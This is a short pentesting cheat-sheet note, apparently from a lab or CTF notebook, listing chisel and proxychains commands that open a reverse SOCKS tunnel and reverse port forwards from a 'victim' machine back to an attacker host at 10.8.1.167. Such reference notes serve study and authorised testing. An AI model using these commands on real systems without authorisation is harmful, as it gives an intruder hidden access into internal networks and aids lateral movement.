#### Note: if you want to open an internal portal to external traffic, use [[Socat#Open external port to access internal]]

```
chisel server -p 8000 --socks5 --reverse // create the encrypted proxy on attacking machine
./chisel client SERVER:PORT R:5000:socks // Set up proxy on victim

Enter "socks5 127.0.0.1 5000" in /etc/proxychains.conf  // Add proxychains proxy
Usage: proxychains -q COMMAND

```

##### Port forward
```
./chisel_linux client 10.8.1.167:5000 R:8000:127.0.0.1:8000    // Victim
// OR
./chisel_linux client 10.8.1.167:5000 R:socks                  // Victim
chisel server -p 5000 --reverse                                // Attacker
```

